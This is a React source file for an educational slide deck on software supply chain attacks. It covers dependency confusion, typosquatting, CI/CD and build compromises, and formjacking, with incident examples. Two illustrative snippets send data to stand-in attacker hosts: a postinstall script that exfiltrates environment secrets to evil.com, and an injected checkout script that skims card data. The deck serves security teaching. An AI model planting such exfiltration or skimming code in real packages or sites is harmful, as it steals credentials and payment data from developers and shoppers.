import SlidePresenter from '../components/SlidePresenter';
import CodeBlock from '../components/CodeBlock';

function YouTubeEmbed({ id, caption }) {
  return (
    <div className="video-embed">
      <iframe
        src={`https://www.youtube.com/embed/${id}`}
        title={caption}
        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
        allowFullScreen
      />
      <div className="video-caption">
        <span className="yt-icon">&#9654;</span> {caption}
      </div>
    </div>
  );
}

function FlowDiagram({ steps }) {
  return (
    <div className="flow-diagram">
      {steps.map((s, i) => (
        <span key={i} style={{ display: 'contents' }}>
          <div className={`flow-box ${s.type || ''}`}>
            <h5>{s.label}</h5>
            <p>{s.desc}</p>
          </div>
          {i < steps.length - 1 && <span className={`flow-arrow ${s.arrowType || ''}`}>&rarr;</span>}
        </span>
      ))}
    </div>
  );
}

const slides = [
  {
    tag: 'Part 1 // Introduction',
    title: 'What is a <span class="highlight">Supply Chain Attack</span>?',
    content: (
      <>
        <div className="slide-quote">
          You don't hack the castle &mdash; you <strong>poison the food supply</strong> going into the castle.
        </div>

        <div className="illustration">
          <div className="illustration-label">How a supply chain attack works</div>
          <div className="illustration-content">
            <FlowDiagram steps={[
              { label: 'Attacker', desc: 'Compromises a component', type: 'attacker', arrowType: 'danger' },
              { label: 'Package / Tool', desc: 'Library, Action, or CDN', type: 'compromised', arrowType: 'danger' },
              { label: 'Trusted Channel', desc: 'npm, update server, CI/CD' },
              { label: 'Victim Org', desc: '1,000s of downstream users', type: 'victim' },
            ]} />
          </div>
        </div>

        <p>
          A supply chain attack targets the <strong>trust relationship</strong> between software consumers
          and their suppliers. Instead of attacking the target directly, adversaries compromise a
          <strong> third-party component</strong> that the target depends on.
          The malicious code flows <strong>downstream</strong> through legitimate, trusted channels.
          Also called <strong>"value-chain attacks"</strong> or <strong>"third-party attacks."</strong>
        </p>

        <div className="illustration">
          <div className="illustration-label">Upstream vs Downstream</div>
          <div className="illustration-content">
            <FlowDiagram steps={[
              { label: 'UPSTREAM', desc: 'Attacker gains access to 3rd-party tool', type: 'attacker', arrowType: 'danger' },
              { label: 'Dependency', desc: 'Library, plugin, CI action, CDN script', type: 'compromised', arrowType: 'danger' },
              { label: 'DOWNSTREAM', desc: 'Malware reaches target via browser/device', type: 'victim' },
            ]} />
          </div>
        </div>
      </>
    ),
  },
  {
    tag: 'Part 1 // Why It Matters',
    title: 'Why Supply Chain Attacks are <span class="highlight">Devastating</span>',
    content: (
      <>
        <div className="slide-grid">
          <div className="slide-grid-item">
            <h4>700+</h4>
            <p>Average transitive dependencies in a Node.js application</p>
          </div>
          <div className="slide-grid-item">
            <h4>Trust Bypass</h4>
            <p>Malicious code arrives through trusted, digitally signed channels</p>
          </div>
          <div className="slide-grid-item">
            <h4>Massive Scale</h4>
            <p>One compromised package can cascade to millions of systems</p>
          </div>
          <div className="slide-grid-item">
            <h4>Hard to Detect</h4>
            <p>Blends with legitimate updates, passes integrity checks</p>
          </div>
        </div>
        <ul>
          <li>SolarWinds (2020): 18,000+ organizations compromised</li>
          <li>tj-actions (2025): 23,000+ GitHub repositories affected</li>
          <li>Trivy Action (2026): 10,000+ CI/CD workflows exploited</li>
        </ul>
      </>
    ),
  },
  {
    tag: 'Part 1 // Taxonomy',
    title: 'Attack Surface <span class="highlight">Taxonomy</span>',
    content: (
      <div className="taxonomy">
        <div className="taxonomy-cat">
          <h4>Source Code</h4>
          <ul>
            <li>Compromised repository</li>
            <li>Malicious commits</li>
            <li>Git submodule attacks</li>
          </ul>
        </div>
        <div className="taxonomy-cat">
          <h4>Dependencies</h4>
          <ul>
            <li>Dependency confusion</li>
            <li>Typosquatting</li>
            <li>Malicious updates</li>
            <li>Transitive dep attacks</li>
          </ul>
        </div>
        <div className="taxonomy-cat">
          <h4>Build System</h4>
          <ul>
            <li>CI/CD pipeline compromise</li>
            <li>Build tool compromise</li>
            <li>Package signing bypass</li>
          </ul>
        </div>
        <div className="taxonomy-cat">
          <h4>Distribution</h4>
          <ul>
            <li>Compromised update servers</li>
            <li>Registry mirror poisoning</li>
            <li>Web cache poisoning</li>
          </ul>
        </div>
        <div className="taxonomy-cat">
          <h4>Browser / Runtime</h4>
          <ul>
            <li>Malicious JS libraries</li>
            <li>Browser extensions</li>
            <li>Compromised CDNs</li>
          </ul>
        </div>
        <div className="taxonomy-cat">
          <h4>Client-Side</h4>
          <ul>
            <li>Magecart / Formjacking</li>
            <li>Watering hole attacks</li>
            <li>Cryptojacking scripts</li>
          </ul>
        </div>
      </div>
    ),
  },
  {
    tag: 'Part 1 // MITRE ATT&CK',
    title: '<span class="highlight">MITRE ATT&CK</span> T1195',
    content: (
      <>
        <p>
          Supply Chain Compromise falls under the <strong>Initial Access</strong> tactic in the MITRE ATT&CK framework.
        </p>
        <table className="slide-table">
          <thead>
            <tr>
              <th>ID</th>
              <th>Sub-Technique</th>
              <th>Description</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td><code>T1195.001</code></td>
              <td>Dependencies & Dev Tools</td>
              <td>Manipulating packages, libraries, or development tools</td>
            </tr>
            <tr>
              <td><code>T1195.002</code></td>
              <td>Software Supply Chain</td>
              <td>Manipulating update servers, build pipelines, delivery mechanisms</td>
            </tr>
            <tr>
              <td><code>T1195.003</code></td>
              <td>Hardware Supply Chain</td>
              <td>Manipulating hardware components or firmware</td>
            </tr>
          </tbody>
        </table>
        <p>
          <strong>Related techniques:</strong> T1059 (Scripting), T1071 (Application Layer Protocol),
          T1027 (Obfuscation), T1078 (Valid Accounts)
        </p>
      </>
    ),
  },
  {
    tag: 'Part 1 // Attack Type A',
    title: '<span class="highlight">Dependency Confusion</span>',
    content: (
      <>
        <p>Exploits how package managers resolve packages from multiple registries.</p>

        <div className="illustration">
          <div className="illustration-label">Version resolution attack flow</div>
          <div className="illustration-content">
            <FlowDiagram steps={[
              { label: 'Private Registry', desc: 'my-utils@1.2.3', type: '' },
              { label: 'npm install', desc: 'resolves highest version', type: 'compromised', arrowType: '' },
              { label: 'Public Registry', desc: 'my-utils@99.0.0', type: 'attacker', arrowType: 'danger' },
              { label: 'Victim Machine', desc: 'Installs v99.0.0!', type: 'victim' },
            ]} />
          </div>
        </div>

        <div className="slide-grid">
          <div className="slide-grid-item">
            <h4>Step 1: Recon</h4>
            <p>Find internal package names from leaked package.json, error messages, or source maps</p>
          </div>
          <div className="slide-grid-item">
            <h4>Step 2: Publish</h4>
            <p>Register same name on public registry with version 99.0.0</p>
          </div>
          <div className="slide-grid-item">
            <h4>Step 3: Confusion</h4>
            <p>npm resolves to v99.0.0 (higher version wins over internal v1.2.3)</p>
          </div>
          <div className="slide-grid-item">
            <h4>Step 4: Execution</h4>
            <p>postinstall hook runs automatically, exfiltrating secrets</p>
          </div>
        </div>
        <CodeBlock
          language="javascript"
          filename="malicious postinstall.js"
          code={`const os = require('os');
const https = require('https');

// Runs AUTOMATICALLY during npm install
const data = JSON.stringify({
  hostname: os.hostname(),
  user: os.userInfo().username,
  env: process.env  // API keys, tokens, secrets
});

https.request({
  hostname: 'attacker-c2.evil.com',
  path: '/exfil', method: 'POST'
}).end(data);`}
        />
      </>
    ),
  },
  {
    tag: 'Part 1 // Attack Type B',
    title: '<span class="highlight">Typosquatting</span>',
    content: (
      <>
        <p>
          Attackers register package names that are common misspellings of popular packages.
          Relies on developers making typos during installation.
        </p>
        <table className="slide-table">
          <thead>
            <tr><th>Legitimate</th><th>Typosquat</th><th>Technique</th></tr>
          </thead>
          <tbody>
            <tr><td><code>lodash</code></td><td><code>lodahs</code></td><td>Character swap</td></tr>
            <tr><td><code>cross-env</code></td><td><code>crossenv</code></td><td>Missing hyphen</td></tr>
            <tr><td><code>colors</code></td><td><code>colros</code></td><td>Letter transposition</td></tr>
            <tr><td><code>express</code></td><td><code>expresss</code></td><td>Extra letter</td></tr>
            <tr><td><code>request</code></td><td><code>reqest</code></td><td>Missing letter</td></tr>
          </tbody>
        </table>
        <p>
          The malicious package typically <strong>re-exports the real package</strong> (so everything works)
          while silently exfiltrating credentials in the background.
        </p>
      </>
    ),
  },
  {
    tag: 'Part 1 // Attack Type C',
    title: '<span class="highlight">Compromised Packages</span> & Malicious Updates',
    content: (
      <>
        <p>
          Attacker gains access to a <strong>legitimate maintainer's account</strong> and publishes
          a new malicious version of a trusted, widely-used package.
        </p>
        <div className="slide-quote">
          The event-stream attack: A burned-out maintainer handed over publishing rights to a
          stranger who injected encrypted code targeting the Copay Bitcoin wallet.
          2M+ weekly downloads compromised.
        </div>
        <ul>
          <li>Package is legitimate with history, stars, and contributors</li>
          <li>Malicious version is published through the official channel</li>
          <li>Passes all integrity checks (valid checksum, signed)</li>
          <li>Dependabot/Renovate may auto-merge the update</li>
          <li>Targeted payloads only activate in specific environments</li>
        </ul>
      </>
    ),
  },
  {
    tag: 'Part 1 // Attack Type D',
    title: '<span class="highlight">CI/CD Pipeline</span> Attacks',
    content: (
      <>
        <p>
          CI/CD environments have access to secrets, cloud credentials, and registry tokens.
          Compromising a GitHub Action gives access to all of them.
        </p>

        <div className="illustration">
          <div className="illustration-label">CI/CD attack chain</div>
          <div className="illustration-content">
            <FlowDiagram steps={[
              { label: 'Attacker', desc: 'Steals PAT / compromises action', type: 'attacker', arrowType: 'danger' },
              { label: 'GitHub Action', desc: 'Tag moved to malicious commit', type: 'compromised', arrowType: 'danger' },
              { label: 'CI/CD Runner', desc: 'Runs with secrets access', type: 'victim', arrowType: 'danger' },
              { label: 'C2 Server', desc: 'Receives stolen tokens', type: 'attacker' },
            ]} />
          </div>
        </div>

        <CodeBlock
          language="yaml"
          filename=".github/workflows/ci.yml"
          code={`# A legitimate-looking workflow
name: CI
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: evil-org/compromised-action@v2
        # ^^^ This action now has access to:
        #   - GITHUB_TOKEN (repo access)
        #   - All configured secrets
        #   - Network access to exfiltrate`}
        />
        <div className="slide-grid">
          <div className="slide-grid-item">
            <h4>tj-actions (2025)</h4>
            <p>23,000+ repos affected. Stolen tokens used to compromise more actions.</p>
          </div>
          <div className="slide-grid-item">
            <h4>Trivy Action (2026)</h4>
            <p>Security scanner weaponized. 10,000+ CI/CD workflows leaked credentials.</p>
          </div>
        </div>
      </>
    ),
  },
  {
    tag: 'Part 1 // Attack Type E',
    title: '<span class="highlight">Build Process</span> Compromise',
    content: (
      <>
        <p>
          The attacker compromises the <strong>build system itself</strong>. Malicious code is injected
          during compilation, so the resulting binary is legitimately signed but contains a backdoor.
        </p>

        <div className="illustration">
          <div className="illustration-label">SolarWinds build compromise flow</div>
          <div className="illustration-content">
            <FlowDiagram steps={[
              { label: 'Clean Source', desc: 'Passes code review', type: '' },
              { label: 'SUNSPOT', desc: 'Swaps file at compile time', type: 'attacker', arrowType: 'danger' },
              { label: 'Compiler', desc: 'Builds trojanized binary', type: 'compromised', arrowType: 'danger' },
              { label: 'Signed Update', desc: 'Legitimately signed!', type: 'victim' },
            ]} />
          </div>
        </div>

        <div className="slide-quote">
          SolarWinds: The SUNSPOT implant monitored build processes, replacing source files during
          compilation and restoring them afterward. The backdoored DLL was signed by SolarWinds'
          legitimate certificate.
        </div>
        <ul>
          <li>Source code in the repo is clean (passes code review)</li>
          <li>Malicious code only exists during compilation</li>
          <li>Tests pass (they run against clean source)</li>
          <li>Binary is legitimately signed</li>
          <li>SUNBURST waited 12-14 days before activating</li>
          <li>Used DGA for C2 domains mimicking SolarWinds traffic</li>
        </ul>
      </>
    ),
  },
  {
    tag: 'Part 1 // Attack Type F',
    title: '<span class="highlight">Browser-Based</span> Supply Chain Attacks',
    content: (
      <>
        <p>
          Attackers target <strong>JavaScript libraries</strong>, <strong>browser extensions</strong>, or
          <strong> third-party scripts</strong> that run directly in end-user browsers. Because browsers
          automatically execute loaded scripts, a single compromised library affects every visitor.
        </p>

        <div className="illustration">
          <div className="illustration-label">Browser-based attack flow</div>
          <div className="illustration-content">
            <FlowDiagram steps={[
              { label: 'Attacker', desc: 'Compromises JS lib or extension', type: 'attacker', arrowType: 'danger' },
              { label: 'CDN / Store', desc: 'Serves malicious code', type: 'compromised', arrowType: 'danger' },
              { label: 'User Browser', desc: 'Auto-executes script', type: 'victim', arrowType: 'danger' },
              { label: 'Stolen Data', desc: 'Cookies, sessions, keystrokes', type: 'attacker' },
            ]} />
          </div>
        </div>

        <div className="slide-grid">
          <div className="slide-grid-item">
            <h4>Magecart / Formjacking</h4>
            <p>Malicious JS injected into checkout forms skims credit card data in real-time. Third-party payment form scripts are the target.</p>
          </div>
          <div className="slide-grid-item">
            <h4>Watering Hole</h4>
            <p>Attacker compromises a website frequented by the target group (e.g. a government portal or industry forum), then delivers malware to all visitors.</p>
          </div>
          <div className="slide-grid-item">
            <h4>Cryptojacking</h4>
            <p>Malicious scripts mine cryptocurrency using visitors' CPUs. Injected via compromised sites, ads, or open-source repos. Users notice slow performance.</p>
          </div>
          <div className="slide-grid-item">
            <h4>polyfill.io (2024)</h4>
            <p>CDN acquired by malicious actor. 100,000+ websites loading polyfill.js were injected with redirects. A real-world CDN supply chain attack.</p>
          </div>
        </div>

        <CodeBlock
          language="html"
          filename="vulnerable website"
          code={`<!-- Formjacking: attacker's script intercepts payment data -->
<form id="checkout" action="/pay">
  <input name="card" type="text" />
  <input name="cvv" type="text" />
</form>

<!-- Injected by compromised 3rd-party script: -->
<script>
document.getElementById('checkout')
  .addEventListener('submit', e => {
    // Silently exfiltrate card data
    fetch('https://evil.com/skim', {
      method: 'POST',
      body: new FormData(e.target)
    });
  });
</script>`}
        />
      </>
    ),
  },
  {
    tag: 'Part 1 // Kill Chain',
    title: 'Supply Chain Attack <span class="highlight">Kill Chain</span>',
    content: (
      <div className="killchain">
        <div className="killchain-step">
          <div className="killchain-num">PHASE 01</div>
          <h4>Recon</h4>
          <p>Discover dependencies, internal names, CI/CD tools</p>
        </div>
        <div className="killchain-step">
          <div className="killchain-num">PHASE 02</div>
          <h4>Compromise</h4>
          <p>Steal credentials, create typosquat, social engineer</p>
        </div>
        <div className="killchain-step">
          <div className="killchain-num">PHASE 03</div>
          <h4>Injection</h4>
          <p>Insert payload into package, action, or build</p>
        </div>
        <div className="killchain-step">
          <div className="killchain-num">PHASE 04</div>
          <h4>Distribution</h4>
          <p>Flows through trusted update channels</p>
        </div>
        <div className="killchain-step">
          <div className="killchain-num">PHASE 05</div>
          <h4>Activation</h4>
          <p>Install hooks, runtime, or delayed trigger</p>
        </div>
        <div className="killchain-step">
          <div className="killchain-num">PHASE 06</div>
          <h4>Exploitation</h4>
          <p>Exfil data, backdoors, lateral movement</p>
        </div>
      </div>
    ),
  },
  {
    tag: 'Part 1 // Comparison',
    title: 'Attack Type <span class="highlight">Comparison Matrix</span>',
    content: (
      <table className="slide-table">
        <thead>
          <tr>
            <th>Attack Type</th>
            <th>Difficulty</th>
            <th>Detection</th>
            <th>Impact</th>
            <th>Example</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>Dependency Confusion</td><td>Low</td><td>Medium</td><td>High</td><td>Birsan (2021)</td>
          </tr>
          <tr>
            <td>Typosquatting</td><td>Very Low</td><td>Easy</td><td>Medium</td><td>crossenv</td>
          </tr>
          <tr>
            <td>Compromised Package</td><td>Medium</td><td>Hard</td><td>Very High</td><td>event-stream</td>
          </tr>
          <tr>
            <td>CI/CD Pipeline</td><td>Medium</td><td>Hard</td><td>Very High</td><td>tj-actions (2025)</td>
          </tr>
          <tr>
            <td>Build Compromise</td><td>Very High</td><td>Very Hard</td><td>Catastrophic</td><td>SolarWinds</td>
          </tr>
          <tr>
            <td>Magecart / Formjacking</td><td>Medium</td><td>Medium</td><td>High</td><td>British Airways</td>
          </tr>
          <tr>
            <td>Watering Hole</td><td>Medium</td><td>Hard</td><td>High</td><td>Gov sites</td>
          </tr>
          <tr>
            <td>Cryptojacking</td><td>Low</td><td>Easy</td><td>Low-Med</td><td>Coinhive scripts</td>
          </tr>
        </tbody>
      </table>
    ),
  },
  {
    tag: 'Part 1 // Video Explainers',
    title: 'Watch: <span class="highlight">Supply Chain Attacks</span> Explained',
    content: (
      <div className="video-grid">
        <YouTubeEmbed
          id="qmXcMACowR4"
          caption='The "Largest Supply Chain Attack Ever" — npm Chalk/Debug compromise (2025)'
        />
        <YouTubeEmbed
          id="MV0XJQf8tT0"
          caption="Dependency Confusion Explained — how version resolution is exploited"
        />
        <YouTubeEmbed
          id="cvumD7bhLWU"
          caption="event-stream: Analysis of a compromised npm package"
        />
        <YouTubeEmbed
          id="7ZcRNvmRz6E"
          caption="How To Find Dependency Confusion in Web Apps — Bug Bounty"
        />
      </div>
    ),
  },
  {
    tag: 'Part 1 // Summary',
    title: 'Key <span class="highlight">Takeaways</span>',
    content: (
      <>
        <div className="slide-grid">
          <div className="slide-grid-item">
            <h4>Trust is the Vulnerability</h4>
            <p>Supply chain attacks exploit the trust developers place in dependencies, tools, and infrastructure.</p>
          </div>
          <div className="slide-grid-item">
            <h4>Massive Blast Radius</h4>
            <p>A single compromised component can cascade to millions of downstream systems.</p>
          </div>
          <div className="slide-grid-item">
            <h4>Detection is Hard</h4>
            <p>Malicious code arrives through legitimate, signed, trusted channels.</p>
          </div>
          <div className="slide-grid-item">
            <h4>Defense in Depth</h4>
            <p>No single measure prevents all attacks. Layered defense is essential.</p>
          </div>
        </div>
        <div className="slide-quote">
          As perimeter security improves, attackers increasingly target the supply chain.
          This is the present and future of cyberattacks.
        </div>
      </>
    ),
  },
];

export default function Theory() {
  return <SlidePresenter slides={slides} />;
}
